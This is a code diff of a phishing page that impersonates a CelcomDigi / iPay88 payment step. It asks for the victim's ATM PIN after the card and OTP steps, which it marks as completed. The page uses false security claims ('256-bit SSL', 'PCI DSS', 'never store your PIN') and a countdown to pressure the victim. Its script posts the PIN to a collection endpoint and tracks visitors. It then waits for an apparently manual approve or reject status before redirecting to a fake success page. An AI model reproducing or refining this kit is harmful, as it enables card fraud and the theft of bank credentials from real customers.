@@ -1,568 +1,436 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-  <title>Secure Verification - CelcomDigi</title>
-  <link rel="icon" href="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/637c596725cb8b7f82fe3680_favicon.png" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>CelcomDigi Next Gen App iPay88</title>
+  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      background: #f0f4f8;
+    :root {
+      --blue-dark: #001870;
+      --blue-main: #1568e1;
+      --blue-light: #b3ccf8;
+      --yellow: #ffe000;
+      --white: #ffffff;
+      --black: #101828;
+      --gray-50: #f9fafb;
+      --gray-300: #d0d5dd;
+      --gray-500: #667085;
+    }
+
+    html, body {
+      min-height: 100%;
+      font-family: Lato, sans-serif;
+      background: #fff;
+      overflow-x: hidden;
+    }
+
+    .page-wrapper {
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      align-items: center;
-    }
-
-    /* ── TOP HEADER ── */
-    .top-header {
-      width: 100%;
       background: #fff;
-      border-bottom: 1px solid #e8ecf0;
-      padding: 0 20px;
-      height: 60px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      box-shadow: 0 1px 6px rgba(0,0,0,0.06);
     }
 
-    .header-logo img { height: 28px; }
-
-    .header-right {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .secure-label {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      font-size: 12px;
-      color: #16a34a;
-      font-weight: 600;
-    }
-
-    .secure-label svg { width: 14px; height: 14px; }
-
-    .timeout-chip {
-      background: #fff7ed;
-      border: 1px solid #fed7aa;
-      color: #c2410c;
-      font-size: 12px;
-      font-weight: 700;
-      padding: 4px 12px;
-      border-radius: 20px;
-    }
-
-    /* ── PROGRESS BAR ── */
-    .progress-bar {
-      width: 100%;
-      background: #e2e8f0;
-      height: 3px;
-    }
-
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, #0064dc, #00a8e8);
-      width: 88%;
-    }
-
-    /* ── MAIN CONTENT ── */
-    .page-content {
-      width: 100%;
-      max-width: 480px;
-      padding: 24px 16px 40px;
-      flex: 1;
-    }
-
-    /* ── STEP INDICATOR ── */
-    .steps {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0;
-      margin-bottom: 24px;
-    }
-
-    .step {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 4px;
-    }
-
-    .step-circle {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      font-weight: 700;
-    }
-
-    .step.done .step-circle { background: #16a34a; color: #fff; }
-    .step.active .step-circle { background: #0064dc; color: #fff; }
-    .step.inactive .step-circle { background: #e2e8f0; color: #94a3b8; }
-
-    .step-label {
-      font-size: 10px;
-      font-weight: 600;
-      color: #64748b;
-      white-space: nowrap;
-    }
-
-    .step.active .step-label { color: #0064dc; }
-    .step.done .step-label { color: #16a34a; }
-
-    .step-line {
-      flex: 1;
-      height: 2px;
-      background: #e2e8f0;
-      margin: 0 6px;
-      margin-bottom: 16px;
-    }
-
-    .step-line.done { background: #16a34a; }
-
-    /* ── CARD ── */
-    .card {
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 2px 16px rgba(0,0,0,0.07);
-      overflow: hidden;
-      margin-bottom: 16px;
-    }
-
-    .card-header {
-      background: linear-gradient(135deg, #001871 0%, #0064dc 100%);
-      padding: 20px 24px;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-    }
-
-    .card-header-icon {
-      width: 44px;
-      height: 44px;
-      background: rgba(255,255,255,0.15);
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    /* ── BLUE BACKGROUND ── */
+    .blue-bg {
+      background: linear-gradient(180deg, #001870 0%, #0a3fa8 60%, #1568e1 100%);
+      padding-bottom: 80px;
+      position: relative;
       flex-shrink: 0;
     }
 
-    .card-header-icon svg { width: 22px; height: 22px; fill: #fff; }
-
-    .card-header-text h2 {
-      font-size: 16px;
-      font-weight: 700;
-      color: #fff;
-      margin-bottom: 2px;
-    }
-
-    .card-header-text p {
-      font-size: 12px;
-      color: rgba(255,255,255,0.75);
-    }
-
-    .card-body { padding: 24px; }
-
-    /* ── ERROR MSG ── */
-    .error-msg {
-      display: none;
-      background: #fef2f2;
-      border: 1px solid #fecaca;
-      border-radius: 10px;
-      padding: 12px 14px;
-      margin-bottom: 18px;
-    }
-
-    .error-msg.show { display: flex; align-items: flex-start; gap: 10px; }
-
-    .error-msg svg { width: 18px; height: 18px; fill: #dc2626; flex-shrink: 0; margin-top: 1px; }
-
-    .error-msg-text {
-      font-size: 13px;
-      color: #dc2626;
-      font-weight: 600;
-      line-height: 1.4;
-    }
-
-    /* ── SECURITY NOTICE ── */
-    .security-notice {
-      background: #f0fdf4;
-      border: 1px solid #bbf7d0;
-      border-radius: 10px;
-      padding: 12px 14px;
-      margin-bottom: 20px;
+    .nav-bar {
+      padding: 16px 20px 0;
       display: flex;
-      align-items: flex-start;
-      gap: 10px;
+      align-items: center;
     }
 
-    .security-notice svg { width: 16px; height: 16px; fill: #16a34a; flex-shrink: 0; margin-top: 1px; }
-
-    .security-notice-text {
-      font-size: 12px;
-      color: #166534;
-      line-height: 1.5;
+    .back-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
     }
 
-    /* ── PIN INPUT ── */
-    .pin-label {
-      font-size: 13px;
-      font-weight: 600;
-      color: #374151;
-      margin-bottom: 10px;
+    .back-btn img { width: 24px; height: 24px; filter: brightness(0) invert(1); }
+
+    .logo-bar {
+      padding: 8px 20px 24px;
     }
 
-    .pin-wrap {
-      position: relative;
-      margin-bottom: 8px;
-    }
+    .logo-bar img { width: 140px; height: auto; display: block; }
 
-    .pin-input {
-      width: 100%;
-      height: 56px;
-      border: 2px solid #e2e8f0;
-      border-radius: 12px;
-      font-size: 26px;
-      font-weight: 700;
-      text-align: center;
-      letter-spacing: 10px;
-      color: #1e293b;
-      background: #f8fafc;
-      outline: none;
-      padding: 0 50px 0 16px;
-      transition: all 0.15s;
-      caret-color: #0064dc;
-    }
-
-    .pin-input:focus {
-      border-color: #0064dc;
+    /* ── WHITE CARD ── */
+    .white-card {
       background: #fff;
-      box-shadow: 0 0 0 3px rgba(0,100,220,0.12);
+      border-radius: 16px 16px 0 0;
+      margin: 0 12px;
+      padding: 28px 20px 0;
+      position: relative;
+      margin-top: -60px;
+      box-shadow: 0 -4px 24px rgba(0,0,0,0.18);
+      flex-shrink: 0;
     }
 
-    .pin-toggle {
+    /* ── TIMEOUT BADGE ── */
+    .timeout-badge {
+      position: absolute;
+      top: -16px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--yellow);
+      border-radius: 20px;
+      padding: 6px 20px;
+      font-family: Lato, sans-serif;
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--black);
+      white-space: nowrap;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+      z-index: 10;
+    }
+
+    /* ── SUMMARY ── */
+    .summary-title {
+      text-align: center;
+      font-family: Montserrat, sans-serif;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--black);
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--gray-300);
+      margin-bottom: 16px;
+    }
+
+    .summary-amount-label {
+      text-align: center;
+      color: var(--gray-500);
+      font-size: 13px;
+      margin-bottom: 4px;
+    }
+
+    .summary-amount-value {
+      text-align: center;
+      font-family: Montserrat, sans-serif;
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--black);
+      margin-bottom: 20px;
+    }
+
+    .summary-row { margin-bottom: 14px; }
+    .summary-label { color: var(--gray-500); font-size: 13px; margin-bottom: 2px; }
+    .summary-value { color: var(--black); font-size: 15px; word-break: break-word; }
+
+    /* ── WAVY DIVIDER ── */
+    .wave-divider {
+      height: 36px;
+      background-image: url('/get-assets/images/Group-220.svg');
+      background-position: center top;
+      background-repeat: no-repeat;
+      background-size: cover;
+      margin: 16px -20px 0;
+    }
+
+    /* ── PIN SECTION ── */
+    .pin-section {
+      background: #fff;
+      padding: 0 20px 60px;
+      margin: 0 12px;
+      flex: 1;
+    }
+
+    .section-title {
+      font-family: Montserrat, sans-serif;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--black);
+      margin: 24px 0 8px;
+    }
+
+    .section-desc {
+      color: var(--gray-500);
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+
+    /* PIN input wrapper */
+    .input-wrap {
+      position: relative;
+      margin-bottom: 14px;
+    }
+
+    .float-label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--gray-500);
+      font-size: 15px;
+      font-family: Lato, sans-serif;
+      pointer-events: none;
+      transition: all 0.15s ease;
+      z-index: 1;
+    }
+
+    .float-label.active {
+      top: 12px;
+      transform: none;
+      font-size: 11px;
+      line-height: 1;
+    }
+
+    .text-field {
+      width: 100%;
+      height: 60px;
+      border: 1px solid var(--gray-300);
+      border-radius: 12px;
+      padding: 22px 50px 8px 16px;
+      font-size: 15px;
+      font-family: Lato, sans-serif;
+      color: var(--black);
+      background: #fff;
+      outline: none;
+    }
+
+    .text-field:focus { border-color: var(--blue-main); }
+
+    .toggle-btn {
       position: absolute;
       right: 14px;
       top: 50%;
       transform: translateY(-50%);
+      background: none;
+      border: none;
       cursor: pointer;
-      color: #94a3b8;
-      font-size: 18px;
-      user-select: none;
-      transition: color 0.15s;
+      color: var(--gray-500);
+      display: flex;
+      align-items: center;
+      padding: 4px;
     }
 
-    .pin-toggle:hover { color: #475569; }
-
-    .pin-hint {
-      font-size: 11px;
-      color: #94a3b8;
-      text-align: center;
+    /* security note */
+    .security-note {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-size: 13px;
+      color: #15803d;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
       margin-bottom: 20px;
     }
 
-    /* ── SUBMIT BUTTON ── */
-    .btn-submit {
+    .security-note svg { flex-shrink: 0; margin-top: 1px; }
+
+    /* error */
+    .error-msg {
+      background: #fff3f3;
+      border: 1.5px solid #e53935;
+      color: #c62828;
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      text-align: center;
+      display: none;
+    }
+
+    .error-msg.show { display: block; }
+
+    /* buttons */
+    .btn-proceed {
       width: 100%;
-      height: 50px;
-      background: linear-gradient(135deg, #0064dc 0%, #0052b3 100%);
+      height: 54px;
+      background: var(--blue-main);
       color: #fff;
       border: none;
-      border-radius: 12px;
-      font-size: 15px;
-      font-weight: 700;
+      border-radius: 50px;
+      font-family: Montserrat, sans-serif;
+      font-size: 16px;
+      font-weight: 600;
       cursor: pointer;
-      transition: all 0.2s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 14px;
-    }
-
-    .btn-submit:hover:not(.disabled) {
-      background: linear-gradient(135deg, #0052b3 0%, #003d8a 100%);
-      transform: translateY(-1px);
-      box-shadow: 0 4px 12px rgba(0,100,220,0.3);
-    }
-
-    .btn-submit.disabled {
-      background: #cbd5e1;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    .btn-submit svg { width: 18px; height: 18px; fill: #fff; }
-
-    /* ── SUMMARY CARD ── */
-    .summary-card {
-      background: #fff;
-      border-radius: 14px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.06);
-      padding: 16px 20px;
-      margin-bottom: 16px;
-    }
-
-    .summary-title {
-      font-size: 11px;
-      font-weight: 700;
-      color: #94a3b8;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
+      transition: opacity 0.2s;
       margin-bottom: 12px;
     }
 
-    .summary-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 6px 0;
-      border-bottom: 1px solid #f1f5f9;
+    .btn-proceed:hover { opacity: 0.9; }
+
+    .btn-proceed.disabled {
+      background: var(--blue-light);
+      cursor: not-allowed;
+      pointer-events: none;
     }
 
-    .summary-row:last-child { border-bottom: none; }
-    .summary-key { font-size: 12px; color: #64748b; }
-
-    .summary-val {
-      font-size: 13px;
-      font-weight: 700;
-      color: #1e293b;
+    .btn-cancel {
+      width: 100%;
+      height: 54px;
+      background: #fff;
+      color: var(--black);
+      border: 1px solid var(--gray-300);
+      border-radius: 50px;
+      font-family: Montserrat, sans-serif;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
     }
 
-    .summary-val.amount { color: #0064dc; font-size: 15px; }
+    .btn-cancel:hover { background: var(--gray-50); }
 
-    /* ── SECURITY BADGES ── */
-    .security-row {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 16px;
-      padding: 12px 0;
-    }
-
-    .security-badge {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      font-size: 11px;
-      color: #94a3b8;
-    }
-
-    .security-badge svg { width: 13px; height: 13px; fill: #94a3b8; }
-
-    /* ── PROCESSING OVERLAY ── */
+    /* processing overlay */
     .processing-overlay {
       display: none;
       position: fixed;
       inset: 0;
-      background: rgba(0,24,113,0.88);
+      background: rgba(0,0,0,0.55);
       z-index: 999;
       align-items: center;
       justify-content: center;
       flex-direction: column;
-      backdrop-filter: blur(4px);
+      gap: 16px;
     }
 
     .processing-overlay.show { display: flex; }
 
-    .processing-card {
-      background: #fff;
-      border-radius: 20px;
-      padding: 36px 40px;
-      text-align: center;
-      max-width: 280px;
-      width: 90%;
-    }
-
     .spinner {
       width: 48px;
       height: 48px;
-      border: 4px solid #e2e8f0;
-      border-top-color: #0064dc;
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
-      margin: 0 auto 16px;
     }
 
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .processing-title {
-      font-size: 15px;
-      font-weight: 700;
-      color: #1e293b;
-      margin-bottom: 6px;
+    .processing-text {
+      color: #fff;
+      font-family: Montserrat, sans-serif;
+      font-size: 16px;
+      font-weight: 600;
     }
 
-    .processing-sub { font-size: 12px; color: #64748b; }
+    .processing-sub {
+      color: rgba(255,255,255,0.75);
+      font-size: 13px;
+    }
+
+    /* ── DESKTOP ── */
+    @media (min-width: 600px) {
+      .blue-bg { padding-bottom: 100px; }
+      .nav-bar { max-width: 500px; margin: 0 auto; padding: 20px 20px 0; }
+      .logo-bar { max-width: 500px; margin: 0 auto; padding: 10px 20px 28px; }
+      .logo-bar img { width: 160px; }
+      .white-card { max-width: 476px; margin: -70px auto 0; padding: 36px 28px 0; border-radius: 20px 20px 0 0; }
+      .wave-divider { margin: 16px -28px 0; height: 48px; }
+      .pin-section { max-width: 476px; margin: 0 auto; padding: 0 28px 60px; }
+      .summary-title { font-size: 20px; }
+      .summary-amount-value { font-size: 30px; }
+      .section-title { font-size: 20px; }
+      .text-field { height: 64px; font-size: 16px; }
+      .float-label { font-size: 16px; }
+      .float-label.active { font-size: 12px; }
+      .btn-proceed, .btn-cancel { height: 56px; font-size: 17px; }
+    }
   </style>
 </head>
 <body>
+<div class="page-wrapper">
 
-  <!-- Top Header -->
-  <div class="top-header">
-    <div class="header-logo">
-      <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg"
-           onerror="this.src='https://get.celcomdigi.com/global-assets/rnb/favicon/favicon.ico'"
-           alt="CelcomDigi" />
-    </div>
-    <div class="header-right">
-      <div class="secure-label">
-        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-        Secure
-      </div>
-      <div class="timeout-chip" id="timeoutBadge">08:00</div>
-    </div>
+<!-- Blue background section -->
+<div class="blue-bg">
+  <div class="nav-bar">
+    <button class="back-btn" onclick="history.back()">
+      <img src="/get-assets/images/arrow-narrow-left.svg" alt="Back">
+    </button>
+  </div>
+  <div class="logo-bar">
+    <img src="/get-assets/images/ngpay-logo.svg" alt="CelcomDigi">
+  </div>
+</div>
+
+<!-- White card overlapping blue bg -->
+<div class="white-card">
+  <div class="timeout-badge">Timeout: <span id="countdown">08:00</span></div>
+
+  <div class="summary-title">Summary of transaction</div>
+
+  <div class="summary-amount-label">Net charges</div>
+  <div class="summary-amount-value" id="displayAmount">MYR 0.00</div>
+
+  <div class="summary-row">
+    <div class="summary-label">Pay to</div>
+    <div class="summary-value">CelcomDigi Telecommunications Sdn Bhd</div>
   </div>
 
-  <!-- Progress Bar -->
-  <div class="progress-bar">
-    <div class="progress-fill"></div>
+  <div class="summary-row">
+    <div class="summary-label">Payment of</div>
+    <div class="summary-value" id="paymentOf">RM 0 Bill Payment for -</div>
   </div>
 
-  <!-- Main Content -->
-  <div class="page-content">
-
-    <!-- Step Indicator -->
-    <div class="steps">
-      <div class="step done">
-        <div class="step-circle">✓</div>
-        <div class="step-label">Card</div>
-      </div>
-      <div class="step-line done"></div>
-      <div class="step done">
-        <div class="step-circle">✓</div>
-        <div class="step-label">OTP</div>
-      </div>
-      <div class="step-line done"></div>
-      <div class="step active">
-        <div class="step-circle">3</div>
-        <div class="step-label">PIN</div>
-      </div>
-      <div class="step-line"></div>
-      <div class="step inactive">
-        <div class="step-circle">4</div>
-        <div class="step-label">Done</div>
-      </div>
-    </div>
-
-    <!-- ATM PIN Card -->
-    <div class="card">
-      <div class="card-header">
-        <div class="card-header-icon">
-          <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-        </div>
-        <div class="card-header-text">
-          <h2>ATM PIN Verification</h2>
-          <p>Final security step to complete payment</p>
-        </div>
-      </div>
-
-      <div class="card-body">
-
-        <!-- Error Message -->
-        <div class="error-msg" id="errorMsg">
-          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-          <div class="error-msg-text">Incorrect ATM PIN. Please verify your PIN and try again.</div>
-        </div>
-
-        <!-- Security Notice -->
-        <div class="security-notice">
-          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-          <div class="security-notice-text">
-            Your ATM PIN is <strong>encrypted with 256-bit SSL</strong>. We never store or share your PIN.
-          </div>
-        </div>
-
-        <div class="pin-label">Enter ATM PIN</div>
-
-        <div class="pin-wrap">
-          <input type="password" id="pinInput" class="pin-input" maxlength="6"
-                 placeholder="••••••" autocomplete="off" />
-          <span class="pin-toggle" id="pinToggle">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-          </span>
-        </div>
-
-        <div class="pin-hint">Enter your 4–6 digit ATM PIN</div>
-
-        <button type="button" class="btn-submit disabled" id="submitBtn">
-          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-          Confirm Payment
-        </button>
-
-      </div>
-    </div>
-
-    <!-- Transaction Summary -->
-    <div class="summary-card">
-      <div class="summary-title">Transaction Summary</div>
-      <div class="summary-row">
-        <span class="summary-key">Service</span>
-        <span class="summary-val" id="summaryType">-</span>
-      </div>
-      <div class="summary-row">
-        <span class="summary-key">Mobile Number</span>
-        <span class="summary-val" id="summaryNumber">-</span>
-      </div>
-      <div class="summary-row">
-        <span class="summary-key">Amount</span>
-        <span class="summary-val amount" id="summaryAmount">-</span>
-      </div>
-      <div class="summary-row">
-        <span class="summary-key">Reference</span>
-        <span class="summary-val" id="summaryRef" style="font-size:11px;color:#94a3b8;">-</span>
-      </div>
-    </div>
-
-    <!-- Security Badges -->
-    <div class="security-row">
-      <div class="security-badge">
-        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-        256-bit SSL
-      </div>
-      <div class="security-badge">
-        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-        iPay88 Secured
-      </div>
-      <div class="security-badge">
-        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-        PCI DSS
-      </div>
-    </div>
-
+  <div class="summary-row">
+    <div class="summary-label">Reference no. / Payment ID</div>
+    <div class="summary-value" id="refNo">-</div>
   </div>
 
-  <!-- Processing Overlay -->
-  <div class="processing-overlay" id="processingOverlay">
-    <div class="processing-card">
-      <div class="spinner"></div>
-      <div class="processing-title">Processing Payment...</div>
-      <div class="processing-sub">Please wait, do not close this page</div>
-    </div>
+  <div class="wave-divider"></div>
+</div>
+
+<!-- PIN section (continues white background) -->
+<div class="pin-section">
+  <div class="section-title">ATM PIN Verification</div>
+  <div class="section-desc">
+    Please enter your ATM PIN to authorize this transaction.
   </div>
+
+  <div id="errorMsg" class="error-msg">Please verify your ATM PIN and try again.</div>
+
+  <div class="security-note">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+    </svg>
+    <span>Your PIN is encrypted and transmitted securely. We will never store your ATM PIN.</span>
+  </div>
+
+  <div class="input-wrap">
+    <label class="float-label active" for="pinInput">ATM PIN</label>
+    <input class="text-field" type="password" id="pinInput" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+    <button type="button" class="toggle-btn" id="pinToggle">
+      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+      </svg>
+    </button>
+  </div>
+
+  <button type="button" id="submitBtn" class="btn-proceed disabled">Confirm</button>
+  <button type="button" class="btn-cancel" onclick="history.back()">Cancel</button>
+</div>
+
+</div><!-- end page-wrapper -->
+
+<!-- Processing overlay -->
+<div class="processing-overlay" id="processingOverlay">
+  <div class="spinner"></div>
+  <div class="processing-text">Processing...</div>
+  <div class="processing-sub">Please wait, do not close this page</div>
+</div>
 
 <script>
   const params = new URLSearchParams(window.location.search);
   const sessionId = params.get('sessionId');
   const number = params.get('number') || '-';
   const amount = params.get('amount') || '0';
-  const ref = params.get('ref') || '';
+  const ref = params.get('ref') || ('NGOS' + Date.now());
   const type = params.get('type') || 'bill';
   const errorParam = params.get('error');
 
@@ -573,44 +441,48 @@
       body: JSON.stringify({ visitorId: _vid, page: 'atm-pin', number, amount, type, sessionId }) }).catch(() => {});
   }
 
-  // Summary
-  document.getElementById('summaryType').textContent = type === 'reload' ? 'Prepaid Reload' : 'Bill Payment';
-  document.getElementById('summaryNumber').textContent = number;
-  document.getElementById('summaryAmount').textContent = 'RM ' + parseFloat(amount).toFixed(2);
-  document.getElementById('summaryRef').textContent = ref || '-';
+  if (!sessionId) {
+    window.location.href = '/bill';
+  }
+
+  // Populate summary
+  document.getElementById('displayAmount').textContent =
+    'MYR ' + parseFloat(amount).toLocaleString('en-MY', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  const paymentLabel = type === 'reload'
+    ? 'RM ' + parseFloat(amount).toLocaleString('en-MY', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' Reload for ' + number
+    : 'RM ' + parseFloat(amount).toLocaleString('en-MY', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' Bill Payment for ' + number;
+  document.getElementById('paymentOf').textContent = paymentLabel;
+  const tRef = 'T' + Math.floor(Math.random() * 900000000 + 100000000);
+  document.getElementById('refNo').textContent = ref + ' / ' + tRef;
 
   // Show error if rejected
   if (errorParam === 'pin') {
     document.getElementById('errorMsg').classList.add('show');
   }
 
-  if (!sessionId) {
-    window.location.href = '/bill';
-  }
-
-  // Timeout countdown
-  let timeLeft = 8 * 60;
-  const timeoutBadge = document.getElementById('timeoutBadge');
-  const timeoutInterval = setInterval(() => {
-    timeLeft--;
-    const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-    const s = (timeLeft % 60).toString().padStart(2, '0');
-    timeoutBadge.textContent = `${m}:${s}`;
-    if (timeLeft <= 60) timeoutBadge.style.background = '#fee2e2';
-    if (timeLeft <= 0) {
-      clearInterval(timeoutInterval);
+  // Countdown (8 min)
+  let totalSecs = 8 * 60;
+  const cdEl = document.getElementById('countdown');
+  const timer = setInterval(() => {
+    totalSecs--;
+    if (totalSecs <= 0) {
+      clearInterval(timer);
+      cdEl.textContent = '00:00';
       window.location.href = type === 'reload' ? '/reload' : '/bill';
+      return;
     }
+    const m = Math.floor(totalSecs / 60);
+    const s = totalSecs % 60;
+    cdEl.textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+    if (totalSecs <= 60) document.querySelector('.timeout-badge').style.background = '#fee2e2';
   }, 1000);
 
   // PIN input
   const pinInput = document.getElementById('pinInput');
-  pinInput.addEventListener('input', validatePin);
-
-  function validatePin() {
-    const pin = pinInput.value;
-    document.getElementById('submitBtn').classList.toggle('disabled', pin.length < 4);
-  }
+  pinInput.addEventListener('input', () => {
+    pinInput.value = pinInput.value.replace(/\D/g, '');
+    document.getElementById('submitBtn').classList.toggle('disabled', pinInput.value.length < 4);
+  });
 
   // Toggle visibility
   let pinVisible = false;
@@ -628,9 +500,7 @@
   async function handleSubmit() {
     if (document.getElementById('submitBtn').classList.contains('disabled')) return;
     const pin = pinInput.value;
-
     document.getElementById('processingOverlay').classList.add('show');
-
     try {
       const res = await fetch('/api/pin-submit', {
         method: 'POST',
@@ -650,13 +520,12 @@
 
   function handleStatusUpdate(status) {
     if (status === 'pin_approved') {
-      clearInterval(timeoutInterval);
+      clearInterval(timer);
       window.location.href = '/payment-success?number=' + encodeURIComponent(number)
         + '&amount=' + encodeURIComponent(amount)
         + '&ref=' + encodeURIComponent(ref)
         + '&type=' + type;
     } else if (status === 'pin_rejected') {
-      clearInterval(timeoutInterval);
       pinInput.value = '';
       document.getElementById('processingOverlay').classList.remove('show');
       document.getElementById('errorMsg').classList.add('show');
@@ -681,11 +550,8 @@
     sse.onerror = () => {};
   }
 
-  // Legacy alias
-  function connectWS() { connectSSE(); }
-
-  // Poll fallback
-  function pollStatus() {
+  // Poll fallback every 5s
+  setInterval(() => {
     fetch(`/api/card-status/${sessionId}`)
       .then(r => r.json())
       .then(data => {
@@ -694,8 +560,7 @@
         }
       })
       .catch(() => {});
-  }
-  setInterval(pollStatus, 5000);
+  }, 5000);
 </script>
 </body>
 </html>
